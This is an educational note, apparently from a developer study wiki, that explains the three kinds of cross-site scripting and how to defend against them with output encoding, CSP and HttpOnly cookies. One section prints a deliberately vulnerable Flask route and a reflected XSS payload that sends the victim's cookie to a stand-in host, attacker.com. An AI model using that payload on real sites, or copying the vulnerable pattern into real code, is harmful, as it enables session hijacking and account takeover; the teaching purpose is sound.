---
title: 03 - Cross-Site Scripting (XSS)
description: "XSS allows attackers to inject JavaScript into pages viewed by other users, enabling session hijacking, credential theft, and arbitrary actions performed in the victim's browser under the application's origin."
tags: [xss, cross-site-scripting, injection, browser-security, security, layer-8]
status: draft
difficulty: intermediate
layer: 8
domain: security
created: 2026-05-18
---

# Cross-Site Scripting (XSS)

> XSS is injection that targets the browser rather than the server  -  understanding the three variants and why the Same-Origin Policy does not stop them is what makes the defenses make sense.

---

## Quick Reference

**Core idea:**
- Stored XSS: malicious script is saved to the database and served to every visitor of a page
- Reflected XSS: malicious script is embedded in a URL, reflected in the HTTP response, and executed when a victim visits the crafted link
- DOM-based XSS: malicious script is never sent to the server  -  it lives in the URL fragment and is injected by client-side JavaScript reading `location.hash` or `document.URL`
- The browser executes injected scripts under the application's origin, giving the attacker full Same-Origin access to cookies, localStorage, and the DOM
- Defense: output encoding (escape `<`, `>`, `"`, `'`, `&` in HTML context), Content Security Policy (CSP), and HttpOnly cookies

**Tricky points:**
- Escaping must be context-sensitive: HTML body, HTML attribute, JavaScript string, CSS, and URL contexts each require different escaping rules  -  HTML-escaping a value inside a `<script>` tag does not prevent XSS
- HttpOnly cookies cannot be read by `document.cookie` in JavaScript, but they are still sent with requests  -  XSS can still use `fetch()` to make authenticated requests even if it cannot steal the cookie value
- CSP does not prevent XSS in the technical sense; it limits what injected scripts can do by restricting script sources, but `unsafe-inline` in a CSP policy negates most protections
- DOM-based XSS is invisible to server-side scanning tools because the malicious payload never reaches the server
- Template engines like Jinja2 auto-escape HTML by default, but `| safe` filters and `Markup()` constructions opt out of escaping  -  these are common sources of XSS in Python web applications

---

## What It Is

Imagine a public bulletin board where anyone can post notes, and visitors read those notes in their browser. If the bulletin board displays a note's text without any filtering, an attacker can post a note containing JavaScript instead of regular text. Every visitor's browser will read that note, see what looks like a script, and execute it  -  in the context of the bulletin board's website. The visitor never asked to run that code, and the browser cannot tell the difference between JavaScript the developer intentionally included and JavaScript an attacker injected.

This is Cross-Site Scripting, and the "cross-site" in the name is historical  -  it originally referred to the script crossing from the attacker's site to the victim's browser via the vulnerable application. The critical insight is that the browser trusts all JavaScript that arrives on a page from a given origin equally. The browser has no way to know that a `<script>` tag or an `onerror=` attribute was injected by an attacker rather than placed there by the developer. Trust is origin-based, not content-based.

Stored XSS is the most dangerous variant because it affects every user who visits the compromised page, not just those who click a crafted link. A stored XSS payload in a comment, a profile field, or a product description executes silently for every visitor. Reflected XSS requires the attacker to distribute a malicious URL  -  a phishing email with a link that includes the payload in a query parameter is the typical delivery method. DOM-based XSS is entirely client-side and requires the application's own JavaScript to read from a URL-controlled source (like `location.search` or `location.hash`) and write it to the DOM without sanitization.

---

## How It Actually Works

Consider a Python Flask application that displays a search query back to the user:

```python
@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<h1>Results for: {query}</h1>"
```

An attacker crafts the URL: `/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`

The response HTML becomes:

```html
<h1>Results for: <script>document.location='https://attacker.com/steal?c='+document.cookie</script></h1>
```

The browser parses this as valid HTML, encounters the script tag, and executes it. The script reads `document.cookie`  -  which includes the session cookie  -  and sends it as a query parameter to the attacker's server. The attacker receives the session cookie in their server logs, sets it in their browser, and is now authenticated as the victim. This entire attack takes one click from the victim on a malicious link.

In Jinja2 templates, the default autoescaping prevents this specific attack because `<` becomes `&lt;`. However, developers who trust their own content often write `{{ user_content | safe }}` to render HTML they believe is safe, or use `Markup(user_content)` in Python code before passing it to the template. A single misplaced `| safe` on a field that eventually receives user-controlled input opens a stored XSS vulnerability.

The most effective mitigation layer is a Content Security Policy header. A strict CSP like `Content-Security-Policy: default-src 'self'; script-src 'self'` instructs the browser to only execute scripts loaded from the application's own origin  -  inline scripts and event handlers are blocked. An attacker who injects `<script>...</script>` into a page with a strict CSP will find that the browser refuses to execute it. However, CSP must be configured carefully; `script-src 'unsafe-inline'` completely disables this protection. The complementary defense for cookie theft specifically is `Set-Cookie: session=...; HttpOnly`  -  this flag prevents JavaScript from reading the cookie at all, so even a successful XSS payload cannot exfiltrate the session token.

---

## How It Connects

XSS is one of the most common paths to session hijacking  -  understanding how sessions and cookies work makes the attack mechanics clearer.

[[session-based-auth|Session-Based Authentication]]

Security headers, particularly Content Security Policy, are the primary server-side control that limits XSS impact  -  they deserve their own detailed treatment.

[[security-headers|Security Headers]]

XSS and CSRF are often confused because both involve attackers exploiting the victim's browser, but they work in opposite directions: XSS injects code into a trusted site, CSRF makes a trusted browser take actions on a site.

[[csrf|Cross-Site Request Forgery]]

---

## Common Misconceptions

Misconception 1: "I validate all inputs on the server, so XSS is not possible."
Reality: Input validation and output encoding are different operations targeting different threats. Input validation enforces business rules (email format, numeric range). Output encoding prevents browsers from interpreting data as HTML or JavaScript. A field that correctly rejects invalid email addresses can still be vulnerable to XSS if the stored value is later rendered without encoding. The fix for XSS happens at output time, not input time.

Misconception 2: "My application uses an API returning JSON, not HTML, so XSS does not apply."
Reality: If any part of the frontend renders API responses into the DOM using `innerHTML`, `document.write()`, or React's `dangerouslySetInnerHTML`, XSS is possible. The vulnerability is where data becomes DOM, not where the data originates. DOM-based XSS is entirely a client-side concern even when the backend is a clean JSON API.

Misconception 3: "The attacker cannot steal the session cookie because it has the HttpOnly flag."
Reality: HttpOnly prevents `document.cookie` from reading the cookie, but an XSS payload can still make authenticated requests using `fetch()`  -  the browser automatically includes HttpOnly cookies in same-origin requests. The attacker can exfiltrate data, change the victim's password, or perform any action the victim's session permits, even without seeing the cookie value. HttpOnly reduces the impact of XSS; it does not eliminate it.

---

## Why It Matters in Practice

XSS is the single most common vulnerability class in web applications and has been continuously present in the OWASP Top 10 since the list's inception. Its impact ranges from defacement (minor) to complete account takeover (critical). In applications where users store sensitive data  -  healthcare, finance, communications  -  stored XSS can expose that data to anyone who visits the page, without the victims having any indication anything is wrong.

For Python developers, the most common XSS introduction patterns are: using `| safe` or `Markup()` on any value that traces back to user input; building HTML responses with f-strings rather than templates; and using JavaScript APIs like `innerHTML` to render content from a Python-generated JSON API without sanitization. Jinja2's autoescaping protects HTML body context automatically, but it cannot protect JavaScript string contexts  -  `var name = "{{ username }}"` is still vulnerable to XSS if `username` contains a double-quote, because HTML-escaping `"` as `&quot;` has no meaning inside a JavaScript string literal.

---

## Interview Angle

Common question forms:
- "What are the three types of XSS and how do they differ?"
- "How does XSS lead to session hijacking?"
- "What is a Content Security Policy and how does it help with XSS?"
- "Does Jinja2 protect against XSS?"

Answer frame:
A strong answer distinguishes stored (persistent, affects all visitors), reflected (requires victim to click a link), and DOM-based (never reaches the server, lives in client-side JS) XSS with a sentence on why each is dangerous. It explains the session hijacking chain: inject JS, read `document.cookie`, send to attacker. It explains CSP as a browser-enforced allowlist of script sources  -  and notes that `unsafe-inline` defeats it. On Jinja2, it answers "yes, in HTML context, but not in JavaScript string context, and `| safe` opts out."

---

## Related Notes

- [[owasp-top-10|OWASP Top 10]]
- [[security-headers|Security Headers]]
- [[csrf|Cross-Site Request Forgery]]
- [[session-based-auth|Session-Based Authentication]]
- [[http-headers|HTTP Headers]]
